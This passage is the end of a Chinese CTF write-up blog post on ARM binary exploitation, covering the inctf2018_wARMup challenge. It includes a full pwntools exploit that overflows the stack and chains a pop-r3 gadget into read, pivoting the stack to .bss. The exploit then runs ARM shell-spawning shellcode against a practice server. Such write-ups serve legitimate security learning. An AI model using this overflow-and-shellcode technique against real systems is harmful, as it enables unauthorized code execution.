+<p>需要注意的是，这里显示arm的NX enabled可能不可靠，通过验证发现堆栈仍然可以执行。因此，我们遇到了arm应该先尝试看看是否堆栈可执行。</p>
+<p>然后，我们用IDA分析一下，发现一个栈溢出漏洞，但是，我们溢出的尺度不大。因此执行不了太多gadgets。</p>
+<img src="/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/image13.png" class="">
+
+<h6 id="寻找gadgets-1"><a href="#寻找gadgets-1" class="headerlink" title="寻找gadgets"></a>寻找gadgets</h6><p>Arm通过R0、R1、R3、R4传递前4个参数，其余的可以自行调试观察。最开始是想到利用puts来泄露，因此，我们需要控制R0寄存器。但是发现找不到一条合适的gadget，因为溢出尺度不大，所以没有找到合适的gadget能够控制R0。因此，尝试ret2shellcode的方法，由于栈地址我们是不知道的，所以我们需要将shellcode布置到bss段，然后ret过去。因此，我们需要调用read函数，但是read函数有三个参数，也不好控制，因此，采用与mips_pwn例题一样的方法，ret2text。</p>
+<img src="/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/image14.png" class="">
+
+<p>其中，R3我们能够找到合适的gadget来控制，因此buf可控，我们就能在bss段布置shellcode。Read结束后，结尾这里会进行栈迁移，因此，我们在shellcode前面放置shellcode的地址，这样就能ret到shellcode里。</p>
+<img src="/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/image15.png" class="">
+
+<p>这里的利用方法似乎与前面介绍的mips的例题一模一样，只是指令不一样罢了。</p>
+<h6 id="完整exp-2"><a href="#完整exp-2" class="headerlink" title="完整exp"></a>完整exp</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#虽然checksec显示NX保护开启，但是可能不准确，调试发现堆栈可以执行</span></span><br><span class="line"><span class="comment">#sh = process(argv=[&#x27;qemu-arm&#x27;,&#x27;-g&#x27;,&#x27;6666&#x27;,&#x27;-L&#x27;,&#x27;/home/sea/arm_pwn/arm-libs&#x27;,&#x27;./wARMup&#x27;])</span></span><br><span class="line">sh = process(argv=[<span class="string">&#x27;qemu-arm&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/home/sea/arm_pwn/arm-libs&#x27;</span>,<span class="string">&#x27;./wARMup&#x27;</span>])</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28774</span>)</span><br><span class="line"></span><br><span class="line">main_read = <span class="number">0x00010530</span></span><br><span class="line">bss = <span class="number">0x00021034</span></span><br><span class="line"><span class="comment">#pop &#123;r3, pc&#125;</span></span><br><span class="line">pop_r3_pc = <span class="number">0x00010364</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x64</span></span><br><span class="line"><span class="comment">#r11</span></span><br><span class="line">payload += p32(bss + <span class="number">0x300</span>)</span><br><span class="line">payload += p32(pop_r3_pc)</span><br><span class="line">payload += p32(bss + <span class="number">0x300</span>)</span><br><span class="line"><span class="comment">#调用main函数里的read先bss短输入新的rop，然后栈迁移到bss段</span></span><br><span class="line">payload += p32(main_read)</span><br><span class="line">sh.sendafter(<span class="string">&#x27;Welcome to bi0s CTF!&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">shellcode = asm(shellcraft.arm.linux.sh(),arch=<span class="string">&#x27;arm&#x27;</span>)</span><br><span class="line">sh.send(p32(bss + <span class="number">0x300</span> + <span class="number">4</span>) + shellcode)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>要学会灵活运用，掌握的是利用的思想，至于平台不同，只是外表的样子看起来不同罢了，思想都是那样，因此，在漏洞挖掘的路上，要学会举一反三。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/ha1vk/tags/aarch64/" rel="tag"># aarch64</a>
+              <a href="/ha1vk/tags/mips/" rel="tag"># mips</a>
+              <a href="/ha1vk/tags/arm/" rel="tag"># arm</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/" rel="prev" title="linux kernel pwn学习之hijack prctl">
+      <i class="fa fa-chevron-left"></i> linux kernel pwn学习之hijack prctl
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/ha1vk/2020/04/05/SROP/" rel="next" title="SROP">
+      SROP <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MIPS%E6%9E%B6%E6%9E%84%E7%9A%84pwn"><span class="nav-number">2.</span> <span class="nav-text">MIPS架构的pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mips%E3%80%81mipsel%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">2.1.</span> <span class="nav-text">mips、mipsel的区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pwn%E4%B8%AD%E9%9C%80%E8%A6%81%E9%87%8D%E7%82%B9%E4%BA%86%E8%A7%A3%E7%9A%84Mips%E6%8C%87%E4%BB%A4"><span class="nav-number">2.2.</span> <span class="nav-text">Pwn中需要重点了解的Mips指令</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BC%A0%E5%8F%82%E6%96%B9%E5%BC%8F"><span class="nav-number">2.2.1.</span> <span class="nav-text">传参方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E5%80%BC"><span class="nav-number">2.2.2.</span> <span class="nav-text">函数返回值</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B7%B3%E8%BD%AC%E6%8C%87%E4%BB%A4"><span class="nav-number">2.2.3.</span> <span class="nav-text">跳转指令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E8%AF%BB%E5%8F%96%E6%8C%87%E4%BB%A4"><span class="nav-number">2.2.4.</span> <span class="nav-text">内存读取指令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%BB%E5%9D%80"><span class="nav-number">2.2.5.</span> <span class="nav-text">寻址</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-number">2.3.</span> <span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AFaxb-2019-mips"><span class="nav-number">2.3.1.</span> <span class="nav-text">安洵杯axb_2019_mips</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AF%BB%E6%89%BEgadgets"><span class="nav-number">2.3.1.1.</span> <span class="nav-text">寻找gadgets</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%B0%83%E8%AF%95"><span class="nav-number">2.3.1.2.</span> <span class="nav-text">调试</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4exp"><span class="nav-number">2.3.1.3.</span> <span class="nav-text">完整exp</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ARM%E6%9E%B6%E6%9E%84%E7%9A%84pwn"><span class="nav-number">3.</span> <span class="nav-text">ARM架构的pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ARM%E5%92%8CAARCH64"><span class="nav-number">3.1.</span> <span class="nav-text">ARM和AARCH64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pwn%E4%B8%AD%E9%9C%80%E8%A6%81%E9%87%8D%E7%82%B9%E4%BA%86%E8%A7%A3%E7%9A%84AARCH64%E6%8C%87%E4%BB%A4"><span class="nav-number">3.2.</span> <span class="nav-text">Pwn中需要重点了解的AARCH64指令</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BC%A0%E5%8F%82%E6%96%B9%E5%BC%8F-1"><span class="nav-number">3.2.1.</span> <span class="nav-text">传参方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E5%80%BC-1"><span class="nav-number">3.2.2.</span> <span class="nav-text">函数返回值</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B7%B3%E8%BD%AC%E6%8C%87%E4%BB%A4-1"><span class="nav-number">3.2.3.</span> <span class="nav-text">跳转指令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E8%AF%BB%E5%8F%96%E6%8C%87%E4%BB%A4-1"><span class="nav-number">3.2.4.</span> <span class="nav-text">内存读取指令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%BB%E5%9D%80-1"><span class="nav-number">3.2.5.</span> <span class="nav-text">寻址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%88%E5%B8%83%E5%B1%80"><span class="nav-number">3.2.6.</span> <span class="nav-text">栈布局</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%97%E9%A2%98"><span class="nav-number">3.3.</span> <span class="nav-text">列题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#shanghai2018-baby-arm"><span class="nav-number">3.3.1.</span> <span class="nav-text">shanghai2018_baby_arm</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4exp-1"><span class="nav-number">3.3.1.1.</span> <span class="nav-text">完整exp</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%B0%83%E8%AF%95-1"><span class="nav-number">3.3.1.2.</span> <span class="nav-text">调试</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ARMEABI"><span class="nav-number">3.4.</span> <span class="nav-text">ARMEABI</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98-1"><span class="nav-number">3.4.1.</span> <span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#inctf2018-wARMup"><span class="nav-number">3.4.1.1.</span> <span class="nav-text">inctf2018_wARMup</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%AF%BB%E6%89%BEgadgets-1"><span class="nav-number">3.4.1.1.1.</span> <span class="nav-text">寻找gadgets</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4exp-2"><span class="nav-number">3.4.1.1.2.</span> <span class="nav-text">完整exp</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ha1vk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/ha1vk/archives/">
+        
+          <span class="site-state-item-count">233</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/ha1vk/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/ha1vk/tags/">
+          
+        <span class="site-state-item-count">145</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha1vk</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/ha1vk/lib/anime.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/ha1vk/js/utils.js"></script>
+
+<script src="/ha1vk/js/motion.js"></script>
+
+
+<script src="/ha1vk/js/schemes/muse.js"></script>
+
+
+<script src="/ha1vk/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
